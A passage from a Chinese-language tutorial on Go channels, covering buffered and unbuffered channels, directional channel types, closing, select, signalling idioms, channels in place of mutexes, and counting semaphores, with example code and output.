class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ch1 &lt;- <span class="number">13</span> <span class="comment">// 将发送操作放入一个新goroutine中执行</span></span><br><span class="line">    &#125;()</span><br><span class="line">    n := &lt;-ch1</span><br><span class="line">    <span class="built_in">println</span>(n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此，可以得出结论：<strong>对无缓冲 channel 类型的发送与接收操作，一定要放在两个不同的 Goroutine 中进行，否则会导致 deadlock（死锁）</strong>。</p><h3 id="缓冲带-channel"><a href="#缓冲带-channel" class="headerlink" title="缓冲带 channel"></a>缓冲带 channel</h3><p>和无缓冲 channel 相反，带缓冲 channel 的运行时层面实现带有缓冲区，因此，<strong>对带缓冲 channel 的发送操作在缓冲区未满、接收操作在缓冲区非空的情况下是异步的</strong>（发送或接收无需阻塞等待）。</p><p>也就是，下面四种情况（仅针对 带缓冲 channel）：</p><ol><li>如果缓冲区已满，进行发送操作，会导致 goroutine 挂起</li><li>如果缓冲区未满，进行发送操作，不会导致 goroutine 阻塞挂起</li><li>如果缓冲区为空，进行接收操作，会导致 goroutine 阻塞挂起</li><li>如果缓冲区有数据，进行接收操作，不会导致 goroutine 阻塞挂起</li></ol><p>可以结合下面的示例代码理解：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 从ch2 的缓冲区接收数据</span></span><br><span class="line">n := &lt;-ch2   <span class="comment">// 因为此时ch2 的缓冲区中无数据，因此将会导致 goroutine 挂起</span></span><br><span class="line">fmt.Println(n)</span><br><span class="line"></span><br><span class="line">ch3 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">ch3 &lt;- <span class="number">17</span> <span class="comment">// 向 ch3 发送一个整型数</span></span><br><span class="line">ch3 &lt;- <span class="number">18</span> <span class="comment">// 由于此时ch3中缓冲区已满，再向ch3发送数据也将导致 goroutine 挂起</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也正是因为带缓冲 channel 与无缓冲 channel 在发送与接收行为上的差异，在具体使用上，它们有各自的“用武之地”，这个我们等会再细说，现在我们先继续把 channel 的基本语法讲完。</p><p>使用操作符<code>&lt;-</code>，还可以声明只发送 channel 类型（send-only）和只接收 channel 类型（recv-only），接着看下面这个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span>&lt;- <span class="keyword">int</span>, <span class="number">1</span>) <span class="comment">// 只发送channel类型</span></span><br><span class="line">ch2 := <span class="built_in">make</span>(&lt;-<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>) <span class="comment">// 只接收channel类型</span></span><br><span class="line">&lt;-ch1       <span class="comment">// invalid operation: &lt;-ch1 (receive from send-only type chan&lt;- int)</span></span><br><span class="line">ch2 &lt;- <span class="number">13</span>   <span class="comment">// invalid operation: ch2 &lt;- 13 (send to receive-only type &lt;-chan int)</span></span><br></pre></td></tr></table></figure><p>可以从上面的示例代码中看到，试图从一个只发送 channel 类型变量中接收数据，或者向一个只接收 channel 类型发送数据，都会导致编译错误。</p><p>通常只发送 channel 类型和只接收 channel 类型，会被用作函数的参数类型或返回值，用于限制对 channel 内的操作，或者是明确可对 channel 进行的操作的类型，比如下面这个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">produce</span><span class="params">(ch <span class="keyword">chan</span>&lt;- <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i + <span class="number">1</span></span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consume</span><span class="params">(ch &lt;-<span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> n := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        <span class="built_in">println</span>(n)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    wg.Add(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        produce(ch)</span><br><span class="line">        wg.Done()</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        consume(ch)</span><br><span class="line">        wg.Done()</span><br><span class="line">    &#125;()</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，分别启动了两个 goroutine，分别代表生产者（produce）和消费者（consume）。</p><p>生产者只能向 channel 中发送数据，使用 <code>chan&lt;- int</code> 作为 produce 函数的参数类型。<br>消费者只能从 channel 中接收数据，使用 <code>int&lt;- chan</code> 作为 consume 函数的参数类型。</p><p>在消费者函数中，使用 <code>for range</code> 从 channel 中接收数据，<code>for range</code> 会阻塞在对 channel 的接收操作，直到 <strong>channel 中有数据可以接收</strong>或者<strong>channel 被关闭循环</strong>，才会继续向下执行。channel 被关闭后，for range 循环也就结束了。</p><h2 id="关闭-channel"><a href="#关闭-channel" class="headerlink" title="关闭 channel"></a>关闭 channel</h2><p>在上面的例子中，produce 函数在发送完数据后，调用 Go 内置的 close 函数关闭了 channel。channel 关闭后，所有等待从这个 channel 接收数据的操作都将返回。</p><p>采用不同接收语法形式的语句，在 channel 被关闭后的返回值的情况：</p><ul><li><code>n := &lt;- ch</code>：当ch被关闭后，n将被赋值为ch元素类型的零值，无法准确判断 channel 是否被关闭</li><li><code>m, ok := &lt;-ch</code>：当ch被关闭后，m将被赋值为ch元素类型的零值, ok值为false，可以准确判断 channel 是否被关闭</li><li><code>for v := range ch</code>：当ch被关闭后，for range循环结束，可以准确判断 channel 是否被关闭</li></ul><p>另外，从上面的示例中还可以看到，channel 是在 produce 函数中被关闭的，这也是 channel 的一个使用惯例，那就是<strong>发送端负责关闭 channel</strong>。</p><p>这里为什么要在发送端关闭 channel 呢？</p><p>这是因为发送端没有像接受端那样的、可以安全判断 channel 是否被关闭了的方法（上面的两种方式）。同时，一旦向一个已经关闭的 channel 执行发送操作，这个操作就会引发 panic：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">5</span>)</span><br><span class="line"><span class="built_in">close</span>(ch)</span><br><span class="line">ch &lt;- <span class="number">13</span> <span class="comment">// panic: send on closed channel</span></span><br></pre></td></tr></table></figure><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>当涉及同时对多个 channel 进行操作时，可以使用 Go 为 CSP 并发模型提供的另外一个原语 select。</p><p>通过 select，可以同时在多个 channel 上进行发送 / 接收操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">ch3 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ch1 &lt;- <span class="number">11</span></span><br><span class="line">ch2 &lt;- <span class="number">12</span></span><br><span class="line">ch3 &lt;- <span class="number">13</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="comment">// 从 channel ch1 接收数据</span></span><br><span class="line"><span class="keyword">case</span> x := &lt;-ch1:</span><br><span class="line"><span class="built_in">println</span>(x)</span><br><span class="line"><span class="comment">// 从channel ch2接收数据，并根据ok值判断ch2是否已经关闭</span></span><br><span class="line"><span class="keyword">case</span> y, ok := &lt;-ch2:</span><br><span class="line"><span class="built_in">println</span>(ok)</span><br><span class="line"><span class="built_in">println</span>(y)</span><br><span class="line"><span class="comment">// 从 channel ch3 接收数据</span></span><br><span class="line"><span class="keyword">case</span> z := &lt;-ch3:</span><br><span class="line"><span class="built_in">println</span>(z)</span><br><span class="line"><span class="comment">// 当上面case中的channel 均无法接收数据时，执行该默认分支</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"default"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先简单了解一下基本语法，后面再详细讲解。</p><h2 id="无缓冲带-channel-惯用法"><a href="#无缓冲带-channel-惯用法" class="headerlink" title="无缓冲带 channel 惯用法"></a>无缓冲带 channel 惯用法</h2><p>无缓冲 channel 兼具通信和同步特性，在并发程序中应用颇为广泛。现在我们来看看几个无缓冲 channel 的典型应用。</p><h3 id="用作信号传递"><a href="#用作信号传递" class="headerlink" title="用作信号传递"></a>用作信号传递</h3><p>无缓冲 channel 用作信号传递的时候，有两种情况，分别是 1 对 1 通知信号和 1 对 n 通知信号。</p><h4 id="1-对-1-通知信号"><a href="#1-对-1-通知信号" class="headerlink" title="1 对 1 通知信号"></a>1 对 1 通知信号</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> signal <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"worker is working..."</span>)</span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spawn</span><span class="params">(f <span class="keyword">func</span>()</span>) &lt;-<span class="title">chan</span> <span class="title">signal</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> signal)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">"worker start to work..."</span>)</span><br><span class="line">        f()</span><br><span class="line">        c &lt;- signal(<span class="keyword">struct</span>&#123;&#125;&#123;&#125;)</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"start a worker..."</span>)</span><br><span class="line">    c := spawn(worker)</span><br><span class="line">    &lt;-c</span><br><span class="line">    fmt.Println(<span class="string">"worker work done!"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出以下结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start a worker...</span><br><span class="line">worker start to work...</span><br><span class="line">worker is working...</span><br><span class="line">worker work done!</span><br></pre></td></tr></table></figure><p>这里之所以会执行 worker 函数（worker 函数是在 新的goroutine内的）。</p><p>spawn 函数返回的 channel 相当于是一个新 goroutine 创建的“通知信号”，利用无缓冲channel 的特性，对无缓冲 channel 的接收和发送操作是同步的，只有同时具备接收和发送能力才会继续往下执行，因此一定是新的 goroutine 先执行完成，然后才是 main goroutine 执行完成。</p><h4 id="1-对-n-通知信号"><a href="#1-对-n-通知信号" class="headerlink" title="1 对 n 通知信号"></a>1 对 n 通知信号</h4><p>有些时候，无缓冲 channel 还被用来实现 1 对 n 的信号通知机制。这样的信号通知机制，常被用于协调多个 Goroutine 一起工作，比如下面的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> signal <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"worker %d: is working...\n"</span>, i)</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">fmt.Printf(<span class="string">"worker %d: works done\n"</span>, i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spawnGroup</span><span class="params">(f <span class="keyword">func</span>(i <span class="keyword">int</span>)</span>, <span class="title">num</span> <span class="title">int</span>, <span class="title">groupSignal</span> &lt;-<span class="title">chan</span> <span class="title">signal</span>) &lt;-<span class="title">chan</span> <span class="title">signal</span></span> &#123;</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> signal)</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; num; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">&lt;-groupSignal</span><br><span class="line">fmt.Printf(<span class="string">"worker %d: start to work...\n"</span>, i)</span><br><span class="line">f(i)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(i + <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">wg.Wait()</span><br><span class="line">c &lt;- signal(<span class="keyword">struct</span>&#123;&#125;&#123;&#125;)</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"start a group of workers..."</span>)</span><br><span class="line">groupSignal := <span class="built_in">make</span>(<span class="keyword">chan</span> signal)</span><br><span class="line">time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">c := spawnGroup(worker, <span class="number">5</span>, groupSignal)</span><br><span class="line">fmt.Println(<span class="string">"the group of workers start to work..."</span>)</span><br><span class="line"><span class="built_in">close</span>(groupSignal)</span><br><span class="line">&lt;-c</span><br><span class="line">fmt.Println(<span class="string">"the group of workers work done!"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，main goroutine 创建了一组 5 个 worker goroutine，这些 Goroutine 启动后会阻塞在名为 groupSignal 的无缓冲 channel 上。</p><p>main goroutine 通过 close(groupSignal)向所有 worker goroutine 广播“开始工作”的信号，收到信号后，所有 worker goroutine 会“同时”开始工作，也就打印出了结果。</p><p>运行上面的示例代码，输出以下结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">start a group of workers...</span><br><span class="line">the group of workers start to work...</span><br><span class="line">worker <span class="number">1</span>: start to work...</span><br><span class="line">worker <span class="number">1</span>: is working...</span><br><span class="line">worker <span class="number">2</span>: start to work...</span><br><span class="line">worker <span class="number">2</span>: is working...</span><br><span class="line">worker <span class="number">3</span>: start to work...</span><br><span class="line">worker <span class="number">3</span>: is working...</span><br><span class="line">worker <span class="number">4</span>: start to work...</span><br><span class="line">worker <span class="number">4</span>: is working...</span><br><span class="line">worker <span class="number">5</span>: start to work...</span><br><span class="line">worker <span class="number">5</span>: is working...</span><br><span class="line">worker <span class="number">5</span>: works done</span><br><span class="line">worker <span class="number">2</span>: works done</span><br><span class="line">worker <span class="number">1</span>: works done</span><br><span class="line">worker <span class="number">3</span>: works done</span><br><span class="line">worker <span class="number">4</span>: works done</span><br><span class="line">the group of workers work done!</span><br></pre></td></tr></table></figure><h3 id="替代锁机制"><a href="#替代锁机制" class="headerlink" title="替代锁机制"></a>替代锁机制</h3><p>无缓冲 channel 具有同步特性，这让它在某些场合可以替代锁，让我们的程序更加清晰，可读性也更好。我们可以对比下两个方案，直观地感受一下。</p><p>首先看下传统基于“共享内存”+“互斥锁”的 Goroutine 安全的计数器的实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> counter <span class="keyword">struct</span> &#123;</span><br><span class="line">    sync.Mutex</span><br><span class="line">    i <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> cter counter</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Increase</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    cter.Lock()</span><br><span class="line">    <span class="keyword">defer</span> cter.Unlock()</span><br><span class="line">    cter.i++</span><br><span class="line">    <span class="keyword">return</span> cter.i</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">            v := Increase()</span><br><span class="line">            fmt.Printf(<span class="string">"goroutine-%d: current counter value is %d\n"</span>, i, v)</span><br><span class="line">            wg.Done()</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，使用了一个带有互斥锁保护的全局变量作为计数器，所有要操作计数器的 Goroutine 共享这个全局变量，并在互斥锁的同步下对计数器进行自增操作。</p><p>接下来再看更符合 Go 设计惯例的实现，也就是使用无缓冲 channel 替代锁后的实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> counter <span class="keyword">struct</span> &#123;</span><br><span class="line">    c <span class="keyword">chan</span> <span class="keyword">int</span></span><br><span class="line">    i <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewCounter</span><span class="params">()</span> *<span class="title">counter</span></span> &#123;</span><br><span class="line">    cter := &amp;counter&#123;</span><br><span class="line">        c: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            cter.i++</span><br><span class="line">            cter.c &lt;- cter.i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> cter</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(cter *counter)</span> <span class="title">Increase</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &lt;-cter.c</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cter := NewCounter()</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">            v := cter.Increase()</span><br><span class="line">            fmt.Printf(<span class="string">"goroutine-%d: current counter value is %d\n"</span>, i, v)</span><br><span class="line">            wg.Done()</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，将计数器操作全部交给一个独立的 Goroutine 去处理，并通过无缓冲 channel 的同步阻塞的特性，实现计数器的控制。<br>这样其他 Goroutine 通过 Increase 函数试图增加计数器值的动作，实质上就转化为了一次无缓冲 channel 的接收动作。</p><p>这种并发设计逻辑更符合 Go 语言所倡导的<strong>“不要通过共享内存来通信，而是通过通信来共享内存”</strong>的原则。</p><p>运行上面的示例代码，可以得到和互斥锁方案相同的输出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">goroutine<span class="number">-9</span>: current counter value is <span class="number">10</span></span><br><span class="line">goroutine<span class="number">-0</span>: current counter value is <span class="number">1</span></span><br><span class="line">goroutine<span class="number">-6</span>: current counter value is <span class="number">7</span></span><br><span class="line">goroutine<span class="number">-2</span>: current counter value is <span class="number">3</span></span><br><span class="line">goroutine<span class="number">-8</span>: current counter value is <span class="number">9</span></span><br><span class="line">goroutine<span class="number">-4</span>: current counter value is <span class="number">5</span></span><br><span class="line">goroutine<span class="number">-5</span>: current counter value is <span class="number">6</span></span><br><span class="line">goroutine<span class="number">-1</span>: current counter value is <span class="number">2</span></span><br><span class="line">goroutine<span class="number">-7</span>: current counter value is <span class="number">8</span></span><br><span class="line">goroutine<span class="number">-3</span>: current counter value is <span class="number">4</span></span><br></pre></td></tr></table></figure><h2 id="带缓冲-channel-的惯用法"><a href="#带缓冲-channel-的惯用法" class="headerlink" title="带缓冲 channel 的惯用法"></a>带缓冲 channel 的惯用法</h2><p>带缓冲的 channel 与无缓冲的 channel 最大的不同之处， 就在于它的异步性。</p><p>对一个带缓冲的 channel，在缓冲区未满的情况下，对它进行发送操作的 Goroutine 不会阻塞挂起; 在缓冲区有数据的情况下，对他进行接收操作的 Goroutine 也不会阻塞挂起。</p><ul><li>无论是 1 收 1 发还是多收多发，带缓冲 channel 的收发性能都要好于无缓冲 channel；</li><li>对于带缓冲 channel 而言，发送与接收的 Goroutine 数量越多，收发性能会有所下降；</li><li>对于带缓冲 channel 而言，选择适当容量会在一定程度上提升收发性能。</li></ul><h3 id="用作计数信号量"><a href="#用作计数信号量" class="headerlink" title="用作计数信号量"></a>用作计数信号量</h3><p>Go 并发设计的一个惯用法，就是将带缓冲 channel 用作计数信号量（counting semaphore）。</p><p>带缓冲 channel 中的当前数据个数代表的是，当前同时处于活动状态（处理业务）的 Goroutine 的数量，而带缓冲 channel 的容量（capacity），就代表了允许同时处于活动状态的 Goroutine 的最大数量。</p><p>向带缓冲 channel 的一个发送操作表示获取一个信号量，而从 channel 的一个接收操作则表示释放一个信号量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> active = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">var</span> jobs = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">8</span>; i++ &#123;</span><br><span class="line">            jobs &lt;- 